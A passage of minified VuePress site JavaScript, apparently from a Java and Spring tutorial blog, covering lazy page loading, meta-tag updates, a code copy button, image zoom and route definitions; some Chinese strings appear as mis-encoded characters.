t.e(22).then(t.bind(null,500))},"v-06ddce46":function(){return t.e(25).then(t.bind(null,501))},"v-b3b797ce":function(){return t.e(24).then(t.bind(null,502))},"v-63e5293d":function(){return t.e(26).then(t.bind(null,503))},"v-4eb895bc":function(){return t.e(27).then(t.bind(null,504))},"v-61e74299":function(){return t.e(28).then(t.bind(null,505))},"v-f7296352":function(){return t.e(29).then(t.bind(null,506))},"v-90a50632":function(){return t.e(31).then(t.bind(null,507))},"v-4452e22a":function(){return t.e(32).then(t.bind(null,508))},"v-689c946e":function(){return t.e(30).then(t.bind(null,509))},"v-5783fd5e":function(){return t.e(34).then(t.bind(null,510))},"v-13c2056a":function(){return t.e(33).then(t.bind(null,511))},"v-41b48450":function(){return t.e(35).then(t.bind(null,512))},"v-6d19a90e":function(){return t.e(36).then(t.bind(null,513))},"v-2504457e":function(){return t.e(37).then(t.bind(null,514))},"v-74f21a38":function(){return t.e(38).then(t.bind(null,515))},"v-9d02e050":function(){return t.e(39).then(t.bind(null,516))},"v-541435c6":function(){return t.e(40).then(t.bind(null,517))},"v-1308af9d":function(){return t.e(41).then(t.bind(null,518))},"v-252f5a65":function(){return t.e(42).then(t.bind(null,519))},"v-8da11b2c":function(){return t.e(43).then(t.bind(null,520))},"v-62410f40":function(){return t.e(44).then(t.bind(null,521))},"v-7dd6a16f":function(){return t.e(45).then(t.bind(null,522))},"v-12a39364":function(){return t.e(46).then(t.bind(null,523))},"v-6ee475a8":function(){return t.e(47).then(t.bind(null,524))},"v-78cfb480":function(){return t.e(49).then(t.bind(null,525))},"v-16683504":function(){return t.e(48).then(t.bind(null,526))},"v-a5b32138":function(){return t.e(50).then(t.bind(null,527))},"v-45042106":function(){return t.e(51).then(t.bind(null,528))},"v-eebfe876":function(){return t.e(52).then(t.bind(null,529))},"v-1652c501":function(){return t.e(53).then(t.bind(null,530))},"v-4d0793a3":function(){return t.e(56).then(t.bind(null,531))},"v-4b59fa74":function(){return t.e(55).then(t.bind(null,532))},"v-7d7d4816":function(){return t.e(57).then(t.bind(null,533))},"v-a7c74124":function(){return t.e(54).then(t.bind(null,534))},"v-734bf71d":function(){return t.e(58).then(t.bind(null,535))},"v-62470732":function(){return t.e(59).then(t.bind(null,536))},"v-668f65e8":function(){return t.e(60).then(t.bind(null,537))},"v-22acaa33":function(){return t.e(61).then(t.bind(null,538))},"v-43fb77b9":function(){return t.e(63).then(t.bind(null,539))},"v-79aee7c8":function(){return t.e(62).then(t.bind(null,540))},"v-5019f548":function(){return t.e(64).then(t.bind(null,541))},"v-21c7009a":function(){return t.e(65).then(t.bind(null,542))},"v-4fcd330d":function(){return t.e(66).then(t.bind(null,543))},"v-6634edc1":function(){return t.e(67).then(t.bind(null,544))},"v-a2835a8a":function(){return t.e(68).then(t.bind(null,545))},"v-46a82521":function(){return t.e(69).then(t.bind(null,546))},"v-30342bb2":function(){return t.e(71).then(t.bind(null,547))},"v-3d481430":function(){return t.e(70).then(t.bind(null,548))},"v-9f012bb0":function(){return t.e(72).then(t.bind(null,549))},"v-19b3d0ca":function(){return t.e(73).then(t.bind(null,550))},"v-0a009914":function(){return t.e(74).then(t.bind(null,551))},"v-44f11504":function(){return t.e(75).then(t.bind(null,552))},"v-754a1f6d":function(){return t.e(76).then(t.bind(null,553))},"v-4a58f399":function(){return t.e(78).then(t.bind(null,554))},"v-bb3e121a":function(){return t.e(77).then(t.bind(null,555))},"v-59de6d20":function(){return t.e(79).then(t.bind(null,556))}};function Ii(n){var e=Object.create(null);return function(t){return e[t]||(e[t]=n(t))}}var Ri=/-(\w)/g,_i=Ii((function(n){return n.replace(Ri,(function(n,e){return e?e.toUpperCase():""}))})),Bi=/\B([A-Z])/g,Oi=Ii((function(n){return n.replace(Bi,"-$1").toLowerCase()})),zi=Ii((function(n){return n.charAt(0).toUpperCase()+n.slice(1)}));function Di(n,e){if(e)return n(e)?n(e):e.includes("-")?n(zi(_i(e))):n(zi(e))||n(Oi(e))}var Mi=Object.assign({},Ti,Ci),Ni=function(n){return Mi[n]},Li=function(n){return Ci[n]},qi=function(n){return Ti[n]},$i=function(n){return Ba.component(n)};function Fi(n){return Di(Li,n)}function Ui(n){return Di(qi,n)}function Vi(n){return Di(Ni,n)}function Gi(n){return Di($i,n)}function Hi(){for(var n=arguments.length,e=new Array(n),t=0;t<n;t++)e[t]=arguments[t];return Promise.all(e.filter((function(n){return n})).map(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){var t;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(Gi(e)||!Vi(e)){n.next=5;break}return n.next=3,Vi(e)();case 3:t=n.sent,Ba.component(e,t.default);case 5:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}()))}function Ji(n,e){"undefined"!=typeof window&&window.__VUEPRESS__&&(window.__VUEPRESS__[n]=e)}var Wi=t(50),Ki=(t(274),t(156),t(51),t(221)),Yi=t.n(Ki),Xi=t(222),Zi=t.n(Xi),Qi={created:function(){if(this.siteMeta=this.$site.headTags.filter((function(n){return"meta"===Object(Wi.a)(n,1)[0]})).map((function(n){var e=Object(Wi.a)(n,2);e[0];return e[1]})),this.$ssrContext){var n=this.getMergedMetaTags();this.$ssrContext.title=this.$title,this.$ssrContext.lang=this.$lang,this.$ssrContext.pageMeta=(e=n)?e.map((function(n){var e="<meta";return Object.keys(n).forEach((function(t){e+=" ".concat(t,'="').concat(Zi()(n[t]),'"')})),e+">"})).join("\n    "):"",this.$ssrContext.canonicalLink=es(this.$canonicalUrl)}var e},mounted:function(){this.currentMetaTags=Object(Ai.a)(document.querySelectorAll("meta")),this.updateMeta(),this.updateCanonicalLink()},methods:{updateMeta:function(){document.title=this.$title,document.documentElement.lang=this.$lang;var n=this.getMergedMetaTags();this.currentMetaTags=ts(n,this.currentMetaTags)},getMergedMetaTags:function(){var n=this.$page.frontmatter.meta||[];return Yi()([{name:"description",content:this.$description}],n,this.siteMeta,rs)},updateCanonicalLink:function(){ns(),this.$canonicalUrl&&document.head.insertAdjacentHTML("beforeend",es(this.$canonicalUrl))}},watch:{$page:function(){this.updateMeta(),this.updateCanonicalLink()}},beforeDestroy:function(){ts(null,this.currentMetaTags),ns()}};function ns(){var n=document.querySelector("link[rel='canonical']");n&&n.remove()}function es(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"";return n?'<link href="'.concat(n,'" rel="canonical" />'):""}function ts(n,e){if(e&&Object(Ai.a)(e).filter((function(n){return n.parentNode===document.head})).forEach((function(n){return document.head.removeChild(n)})),n)return n.map((function(n){var e=document.createElement("meta");return Object.keys(n).forEach((function(t){e.setAttribute(t,n[t])})),document.head.appendChild(e),e}))}function rs(n){for(var e=0,t=["name","property","itemprop"];e<t.length;e++){var r=t[e];if(n.hasOwnProperty(r))return n[r]+r}return JSON.stringify(n)}t(149);var as=t(157),os={mounted:function(){window.addEventListener("scroll",this.onScroll)},methods:{onScroll:t.n(as)()((function(){this.setActiveHash()}),300),setActiveHash:function(){for(var n=this,e=[].slice.call(document.querySelectorAll(".sidebar-link")),t=[].slice.call(document.querySelectorAll(".header-anchor")).filter((function(n){return e.some((function(e){return e.hash===n.hash}))})),r=Math.max(window.pageYOffset,document.documentElement.scrollTop,document.body.scrollTop),a=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight),o=window.innerHeight+r,i=0;i<t.length;i++){var s=t[i],c=t[i+1],l=0===i&&0===r||r>=s.parentElement.offsetTop+10&&(!c||r<c.parentElement.offsetTop-10),p=decodeURIComponent(this.$route.hash);if(l&&p!==decodeURIComponent(s.hash)){var d=s;if(o===a)for(var u=i+1;u<t.length;u++)if(p===decodeURIComponent(t[u].hash))return;return this.$vuepress.$set("disableScrollBehavior",!0),void this.$router.replace(decodeURIComponent(d.hash),(function(){n.$nextTick((function(){n.$vuepress.$set("disableScrollBehavior",!1)}))}))}}}},beforeDestroy:function(){window.removeEventListener("scroll",this.onScroll)}},is=(t(58),t(109)),ss=t.n(is),cs={mounted:function(){var n=this;ss.a.configure({showSpinner:!1}),this.$router.beforeEach((function(n,e,t){n.path===e.path||Ba.component(n.name)||ss.a.start(),t()})),this.$router.afterEach((function(){ss.a.done(),n.isSidebarOpen=!1}))}};t(80),t(110),t(83),t(369);function ls(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}t(105);function ps(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}function ds(n,e,t){return e&&ps(n.prototype,e),t&&ps(n,t),Object.defineProperty(n,"prototype",{writable:!1}),n}t(370);var us=function(){function n(){ls(this,n);this.containerEl=document.getElementById("message-container"),this.containerEl||(this.containerEl=document.createElement("div"),this.containerEl.id="message-container",document.body.appendChild(this.containerEl))}return ds(n,[{key:"show",value:function(n){var e=this,t=n.text,r=void 0===t?"":t,a=n.duration,o=void 0===a?3e3:a,i=document.createElement("div");i.className="message move-in",i.innerHTML='\n      <i style="fill: #06a35a;font-size: 14px;display:inline-flex;align-items: center;">\n        <svg style="fill: #06a35a;font-size: 14px;" t="1572421810237" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2323" width="16" height="16"><path d="M822.811993 824.617989c-83.075838 81.99224-188.546032 124.613757-316.049383 127.86455-122.085362-3.250794-223.943563-45.87231-305.935802-127.86455s-124.613757-184.21164-127.86455-305.935802c3.250794-127.503351 45.87231-232.973545 127.86455-316.049383 81.99224-83.075838 184.21164-126.058554 305.935802-129.309347 127.503351 3.250794 232.973545 46.23351 316.049383 129.309347 83.075838 83.075838 126.058554 188.546032 129.309347 316.049383C949.231746 640.406349 905.887831 742.62575 822.811993 824.617989zM432.716755 684.111464c3.973192 3.973192 8.307584 5.779189 13.364374 6.140388 5.05679 0.361199 9.752381-1.444797 13.364374-5.417989l292.571429-287.514638c3.973192-3.973192 5.779189-8.307584 5.779189-13.364374 0-5.05679-1.805996-9.752381-5.779189-13.364374l1.805996 1.805996c-3.973192-3.973192-8.668783-5.779189-14.086772-6.140388-5.417989-0.361199-10.47478 1.444797-14.809171 5.417989l-264.397884 220.33157c-3.973192 3.250794-8.668783 4.695591-14.447972 4.695591-5.779189 0-10.835979-1.444797-15.53157-3.973192l-94.273016-72.962257c-4.334392-3.250794-9.391182-4.334392-14.447972-3.973192s-9.391182 3.250794-12.641975 7.585185l-2.889594 3.973192c-3.250794 4.334392-4.334392 9.391182-3.973192 14.809171 0.722399 5.417989 2.528395 10.11358 5.779189 14.086772L432.716755 684.111464z" p-id="2324"></path></svg>\n      </i>\n      <div class="text">'.concat(r,"</div>\n    "),this.containerEl.appendChild(i),o>0&&setTimeout((function(){e.close(i)}),o)}},{key:"close",value:function(n){n.className=n.className.replace("move-in",""),n.className+="move-out",n.addEventListener("animationend",(function(){n.remove()}))}}]),n}(),ms={mounted:function(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},updated:function(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},methods:{updateCopy:function(){var n=this;setTimeout((function(){(['div[class*="language-"] pre','div[class*="aside-code"] aside']instanceof Array||Array.isArray(['div[class*="language-"] pre','div[class*="aside-code"] aside']))&&['div[class*="language-"] pre','div[class*="aside-code"] aside'].forEach((function(e){document.querySelectorAll(e).forEach(n.generateCopyButton)}))}),1e3)},generateCopyButton:function(n){var e=this;if(!n.classList.contains("codecopy-enabled")){var t=document.createElement("i");t.className="code-copy",t.innerHTML='<svg  style="color:#aaa;font-size:14px" t="1572422231464" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="3201" width="14" height="14"><path d="M866.461538 39.384615H354.461538c-43.323077 0-78.769231 35.446154-78.76923 78.769231v39.384616h472.615384c43.323077 0 78.769231 35.446154 78.769231 78.76923v551.384616h39.384615c43.323077 0 78.769231-35.446154 78.769231-78.769231V118.153846c0-43.323077-35.446154-78.769231-78.769231-78.769231z m-118.153846 275.692308c0-43.323077-35.446154-78.769231-78.76923-78.769231H157.538462c-43.323077 0-78.769231 35.446154-78.769231 78.769231v590.769231c0 43.323077 35.446154 78.769231 78.769231 78.769231h512c43.323077 0 78.769231-35.446154 78.76923-78.769231V315.076923z m-354.461538 137.846154c0 11.815385-7.876923 19.692308-19.692308 19.692308h-157.538461c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h157.538461c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z m157.538461 315.076923c0 11.815385-7.876923 19.692308-19.692307 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h315.076923c11.815385 0 19.692308 7.876923 19.692307 19.692308v39.384615z m78.769231-157.538462c0 11.815385-7.876923 19.692308-19.692308 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h393.846153c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z" p-id="3202"></path></svg>',t.title="Copy to clipboard",t.addEventListener("click",(function(){e.copyToClipboard(n.innerText)})),n.appendChild(t),n.classList.add("codecopy-enabled")}},copyToClipboard:function(n){var e=document.createElement("textarea");e.value=n,e.setAttribute("readonly",""),e.style.position="absolute",e.style.left="-9999px",document.body.appendChild(e);var t=document.getSelection().rangeCount>0&&document.getSelection().getRangeAt(0);e.select(),document.execCommand("copy"),(new us).show({text:"å¤å¶æå",duration:1e3}),document.body.removeChild(e),t&&(document.getSelection().removeAllRanges(),document.getSelection().addRange(t))}}},gs=(t(79),"auto"),fs="zoom-in",bs="zoom-out",hs="grab",vs="move";function ys(n,e,t){var r=!(arguments.length>3&&void 0!==arguments[3])||arguments[3],a={passive:!1};r?n.addEventListener(e,t,a):n.removeEventListener(e,t,a)}function ks(n,e){if(n){var t=new Image;t.onload=function(){e&&e(t)},t.src=n}}function xs(n){return n.dataset.original?n.dataset.original:"A"===n.parentNode.tagName?n.parentNode.getAttribute("href"):null}function ws(n,e,t){!function(n){var e=Ss,t=js;if(n.transition){var r=n.transition;delete n.transition,n[e]=r}if(n.transform){var a=n.transform;delete n.transform,n[t]=a}}(e);var r=n.style,a={};for(var o in e)t&&(a[o]=r[o]||""),r[o]=e[o];return a}var Ss="transition",js="transform",Es="transform",Ps="transitionend";var As=function(){},Ts={enableGrab:!0,preloadImage:!1,closeOnWindowResize:!0,transitionDuration:.4,transitionTimingFunction:"cubic-bezier(0.4, 0, 0, 1)",bgColor:"rgb(255, 255, 255)",bgOpacity:1,scaleBase:1,scaleExtra:.5,scrollThreshold:40,zIndex:998,customSize:null,onOpen:As,onClose:As,onGrab:As,onMove:As,onRelease:As,onBeforeOpen:As,onBeforeClose:As,onBeforeGrab:As,onBeforeRelease:As,onImageLoading:As,onImageLoaded:As},Cs={init:function(n){var e,t;e=this,t=n,Object.getOwnPropertyNames(Object.getPrototypeOf(e)).forEach((function(n){e[n]=e[n].bind(t)}))},click:function(n){if(n.preventDefault(),Rs(n))return window.open(this.target.srcOriginal||n.currentTarget.src,"_blank");this.shown?this.released?this.close():this.release():this.open(n.currentTarget)},scroll:function(){var n=document.documentElement||document.body.parentNode||document.body,e=window.pageXOffset||n.scrollLeft,t=window.pageYOffset||n.scrollTop;null===this.lastScrollPosition&&(this.lastScrollPosition={x:e,y:t});var r=this.lastScrollPosition.x-e,a=this.lastScrollPosition.y-t,o=this.options.scrollThreshold;(Math.abs(a)>=o||Math.abs(r)>=o)&&(this.lastScrollPosition=null,this.close())},keydown:function(n){(function(n){return"Escape"===(n.key||n.code)||27===n.keyCode})(n)&&(this.released?this.close():this.release(this.close))},mousedown:function(n){if(Is(n)&&!Rs(n)){n.preventDefault();var e=n.clientX,t=n.clientY;this.pressTimer=setTimeout(function(){this.grab(e,t)}.bind(this),200)}},mousemove:function(n){this.released||this.move(n.clientX,n.clientY)},mouseup:function(n){Is(n)&&!Rs(n)&&(clearTimeout(this.pressTimer),this.released?this.close():this.release())},touchstart:function(n){n.preventDefault();var e=n.touches[0],t=e.clientX,r=e.clientY;this.pressTimer=setTimeout(function(){this.grab(t,r)}.bind(this),200)},touchmove:function(n){if(!this.released){var e=n.touches[0],t=e.clientX,r=e.clientY;this.move(t,r)}},touchend:function(n){(function(n){n.targetTouches.length})(n)||(clearTimeout(this.pressTimer),this.released?this.close():this.release())},clickOverlay:function(){this.close()},resizeWindow:function(){this.close()}};function Is(n){return 0===n.button}function Rs(n){return n.metaKey||n.ctrlKey}var _s={init:function(n){this.el=document.createElement("div"),this.instance=n,this.parent=document.body,ws(this.el,{position:"fixed",top:0,left:0,right:0,bottom:0,opacity:0}),this.updateStyle(n.options),ys(this.el,"click",n.handler.clickOverlay.bind(n))},updateStyle:function(n){ws(this.el,{zIndex:n.zIndex,backgroundColor:n.bgColor,transition:"opacity\n        "+n.transitionDuration+"s\n        "+n.transitionTimingFunction})},insert:function(){this.parent.appendChild(this.el)},remove:function(){this.parent.removeChild(this.el)},fadeIn:function(){this.el.offsetWidth,this.el.style.opacity=this.instance.options.bgOpacity},fadeOut:function(){this.el.style.opacity=0}},Bs="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},Os=function(){function n(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}return function(e,t,r){return t&&n(e.prototype,t),r&&n(e,r),e}}(),zs=Object.assign||function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r])}return n},Ds={init:function(n,e){this.el=n,this.instance=e,this.srcThumbnail=this.el.getAttribute("src"),this.srcset=this.el.getAttribute("srcset"),this.srcOriginal=xs(this.el),this.rect=this.el.getBoundingClientRect(),this.translate=null,this.scale=null,this.styleOpen=null,this.styleClose=null},zoomIn:function(){var n=this.instance.options,e=n.zIndex,t=n.enableGrab,r=n.transitionDuration,a=n.transitionTimingFunction;this.translate=this.calculateTranslate(),this.scale=this.calculateScale(),this.styleOpen={position:"relative",zIndex:e+1,cursor:t?hs:bs,transition:Es+"\n        "+r+"s\n        "+a,transform:"translate3d("+this.translate.x+"px, "+this.translate.y+"px, 0px)\n        scale("+this.scale.x+","+this.scale.y+")",height:this.rect.height+"px",width:this.rect.width+"px"},this.el.offsetWidth,this.styleClose=ws(this.el,this.styleOpen,!0)},zoomOut:function(){this.el.offsetWidth,ws(this.el,{transform:"none"})},grab:function(n,e,t){var r=Ms(),a=r.x-n,o=r.y-e;ws(this.el,{cursor:vs,transform:"translate3d(\n        "+(this.translate.x+a)+"px, "+(this.translate.y+o)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},move:function(n,e,t){var r=Ms(),a=r.x-n,o=r.y-e;ws(this.el,{transition:Es,transform:"translate3d(\n        "+(this.translate.x+a)+"px, "+(this.translate.y+o)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},restoreCloseStyle:function(){ws(this.el,this.styleClose)},restoreOpenStyle:function(){ws(this.el,this.styleOpen)},upgradeSource:function(){if(this.srcOriginal){var n=this.el.parentNode;this.srcset&&this.el.removeAttribute("srcset");var e=this.el.cloneNode(!1);e.setAttribute("src",this.srcOriginal),e.style.position="fixed",e.style.visibility="hidden",n.appendChild(e),setTimeout(function(){this.el.setAttribute("src",this.srcOriginal),n.removeChild(e)}.bind(this),50)}},downgradeSource:function(){this.srcOriginal&&(this.srcset&&this.el.setAttribute("srcset",this.srcset),this.el.setAttribute("src",this.srcThumbnail))},calculateTranslate:function(){var n=Ms(),e=this.rect.left+this.rect.width/2,t=this.rect.top+this.rect.height/2;return{x:n.x-e,y:n.y-t}},calculateScale:function(){var n=this.el.dataset,e=n.zoomingHeight,t=n.zoomingWidth,r=this.instance.options,a=r.customSize,o=r.scaleBase;if(!a&&e&&t)return{x:t/this.rect.width,y:e/this.rect.height};if(a&&"object"===(void 0===a?"undefined":Bs(a)))return{x:a.width/this.rect.width,y:a.height/this.rect.height};var i=this.rect.width/2,s=this.rect.height/2,c=Ms(),l={x:c.x-i,y:c.y-s},p=l.x/i,d=l.y/s,u=o+Math.min(p,d);if(a&&"string"==typeof a){var m=t||this.el.naturalWidth,g=e||this.el.naturalHeight,f=parseFloat(a)*m/(100*this.rect.width),b=parseFloat(a)*g/(100*this.rect.height);if(u>f||u>b)return{x:f,y:b}}return{x:u,y:u}}};function Ms(){var n=document.documentElement;return{x:Math.min(n.clientWidth,window.innerWidth)/2,y:Math.min(n.clientHeight,window.innerHeight)/2}}function Ns(n,e,t){["mousedown","mousemove","mouseup","touchstart","touchmove","touchend"].forEach((function(r){ys(n,r,e[r],t)}))}var Ls=function(){function n(e){!function(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}(this,n),this.target=Object.create(Ds),this.overlay=Object.create(_s),this.handler=Object.create(Cs),this.body=document.body,this.shown=!1,this.lock=!1,this.released=!0,this.lastScrollPosition=null,this.pressTimer=null,this.options=zs({},Ts,e),this.overlay.init(this),this.handler.init(this)}return Os(n,[{key:"listen",value:function(n){if("string"==typeof n)for(var e=document.querySelectorAll(n),t=e.length;t--;)this.listen(e[t]);else"IMG"===n.tagName&&(n.style.cursor=fs,ys(n,"click",this.handler.click),this.options.preloadImage&&ks(xs(n)));return this}},{key:"config",value:function(n){return n?(zs(this.options,n),this.overlay.updateStyle(this.options),this):this.options}},{key:"open",value:function(n){var e=this,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:this.options.onOpen;if(!this.shown&&!this.lock){var r="string"==typeof n?document.querySelector(n):n;if("IMG"===r.tagName){if(this.options.onBeforeOpen(r),this.target.init(r,this),!this.options.preloadImage){var a=this.target.srcOriginal;null!=a&&(this.options.onImageLoading(r),ks(a,this.options.onImageLoaded))}this.shown=!0,this.lock=!0,this.target.zoomIn(),this.overlay.insert(),this.overlay.fadeIn(),ys(document,"scroll",this.handler.scroll),ys(document,"keydown",this.handler.keydown),this.options.closeOnWindowResize&&ys(window,"resize",this.handler.resizeWindow);var o=function n(){ys(r,Ps,n,!1),e.lock=!1,e.target.upgradeSource(),e.options.enableGrab&&Ns(document,e.handler,!0),t(r)};return ys(r,Ps,o),this}}}},{key:"close",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onClose;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeClose(t),this.lock=!0,this.body.style.cursor=gs,this.overlay.fadeOut(),this.target.zoomOut(),ys(document,"scroll",this.handler.scroll,!1),ys(document,"keydown",this.handler.keydown,!1),this.options.closeOnWindowResize&&ys(window,"resize",this.handler.resizeWindow,!1);var r=function r(){ys(t,Ps,r,!1),n.shown=!1,n.lock=!1,n.target.downgradeSource(),n.options.enableGrab&&Ns(document,n.handler,!1),n.target.restoreCloseStyle(),n.overlay.remove(),e(t)};return ys(t,Ps,r),this}}},{key:"grab",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onGrab;if(this.shown&&!this.lock){var a=this.target.el;this.options.onBeforeGrab(a),this.released=!1,this.target.grab(n,e,t);var o=function n(){ys(a,Ps,n,!1),r(a)};return ys(a,Ps,o),this}}},{key:"move",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onMove;if(this.shown&&!this.lock){this.released=!1,this.body.style.cursor=vs,this.target.move(n,e,t);var a=this.target.el,o=function n(){ys(a,Ps,n,!1),r(a)};return ys(a,Ps,o),this}}},{key:"release",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onRelease;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeRelease(t),this.lock=!0,this.body.style.cursor=gs,this.target.restoreOpenStyle();var r=function r(){ys(t,Ps,r,!1),n.lock=!1,n.released=!0,e(t)};return ys(t,Ps,r),this}}}]),n}(),qs=".theme-vdoing-content img:not(.no-zoom)",$s=JSON.parse('{"bgColor":"rgba(0,0,0,0.6)"}'),Fs=Number("500"),Us=function(){function n(){ls(this,n),this.instance=new Ls($s)}return ds(n,[{key:"update",value:function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:qs;"undefined"!=typeof window&&this.instance.listen(n)}},{key:"updateDelay",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:qs,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:Fs;setTimeout((function(){return n.update(e)}),t)}}]),n}(),Vs=[Qi,os,cs,ms,{watch:{"$page.path":function(){void 0!==this.$vuepress.zooming&&this.$vuepress.zooming.updateDelay()}},mounted:function(){this.$vuepress.zooming=new Us,this.$vuepress.zooming.updateDelay()}}],Gs={name:"GlobalLayout",computed:{layout:function(){var n=this.getLayout();return Ji("layout",n),Ba.component(n)}},methods:{getLayout:function(){if(this.$page.path){var n=this.$page.frontmatter.layout;return n&&(this.$vuepress.getLayoutAsyncComponent(n)||this.$vuepress.getVueComponent(n))?n:"Layout"}return"NotFound"}}},Hs=t(41),Js=Object(Hs.a)(Gs,(function(){var n=this.$createElement;return(this._self._c||n)(this.layout,{tag:"component"})}),[],!1,null,null,null).exports;!function(n,e,t){var r;switch(e){case"components":n[e]||(n[e]={}),Object.assign(n[e],t);break;case"mixins":n[e]||(n[e]=[]),(r=n[e]).push.apply(r,Object(Ai.a)(t));break;default:throw new Error("Unknown option name.")}}(Js,"mixins",Vs);var Ws=[{name:"v-4a355d2a",path:"/java/100/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-4a355d2a").then(t)}},{path:"/java/100/index.html",redirect:"/java/100/"},{path:"/00.java/10.java/100.java.html",redirect:"/java/100/"},{name:"v-104240f2",path:"/java/101/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-104240f2").then(t)}},{path:"/java/101/index.html",redirect:"/java/101/"},{path:"/00.java/10.java/101.æåexeç¨åº.html",redirect:"/java/101/"},{name:"v-2acc2292",path:"/java/102/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-2acc2292").then(t)}},{path:"/java/102/index.html",redirect:"/java/102/"},{path:"/00.java/10.java/102.javaä»£ç æ··æ·ä¹ProGuard.html",redirect:"/java/102/"},{name:"v-5ba1bd3a",path:"/spring/spring/200/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-5ba1bd3a").then(t)}},{path:"/spring/spring/200/index.html",redirect:"/spring/spring/200/"},{path:"/00.java/20.Spring/21.spring/200.æ ¸å¿åå®¹æè§£ IOC.html",redirect:"/spring/spring/200/"},{name:"v-1a1b5d5b",path:"/spring/spring/201/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-1a1b5d5b").then(t)}},{path:"/spring/spring/201/index.html",redirect:"/spring/spring/201/"},{path:"/00.java/20.Spring/21.spring/201.æ ¸å¿åå®¹æè§£ AOP.html",redirect:"/spring/spring/201/"},{name:"v-c385f750",path:"/spring/spring/203/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-c385f750").then(t)}},{path:"/spring/spring/203/index.html",redirect:"/spring/spring/203/"},{path:"/00.java/20.Spring/21.spring/203.æ ¸å¿åå®¹æè§£ ä¸çº§ç¼å­.html",redirect:"/spring/spring/203/"},{name:"v-c10cfd86",path:"/spring/spring/202/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-c10cfd86").then(t)}},{path:"/spring/spring/202/index.html",redirect:"/spring/spring/202/"},{path:"/00.java/20.Spring/21.spring/202.æ ¸å¿åå®¹æè§£ äºä»¶éç¥.html",redirect:"/spring/spring/202/"},{name:"v-1e178af1",path:"/spring/spring/204/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-1e178af1").then(t)}},{path:"/spring/spring/204/index.html",redirect:"/spring/spring/204/"},{path:"/00.java/20.Spring/21.spring/204.æ ¸å¿åå®¹æè§£ FactoryBean.html",redirect:"/spring/spring/204/"},{name:"v-7c3f2df1",path:"/spring/spring-mvc/200/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-7c3f2df1").then(t)}},{path:"/spring/spring-mvc/200/index.html",redirect:"/spring/spring-mvc/200/"},{path:"/00.java/20.Spring/22.spring mv/200.Spring MVC ä¹å·¥ä½åç.html",redirect:"/spring/spring-mvc/200/"},{name:"v-7b24cf72",path:"/spring/spring/205/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-7b24cf72").then(t)}},{path:"/spring/spring/205/index.html",redirect:"/spring/spring/205/"},{path:"/00.java/20.Spring/21.spring/205.æ³¨è§£æ¿ä»£Springçå½å¨æå®ç°ç±».html",redirect:"/spring/spring/205/"},{name:"v-06ddce46",path:"/spring/spring-boot/201/",component:Js,beforeEnter:function(n,e,t){Hi("Layout","v-06ddce46").then(t)}},{path:"/spring/spring-boot/201/index.html",redirect:"/spring/spring-boot/201/"},{path:"/00.java/20.Spring/23.springboot/201.SpringBoot ä¹ 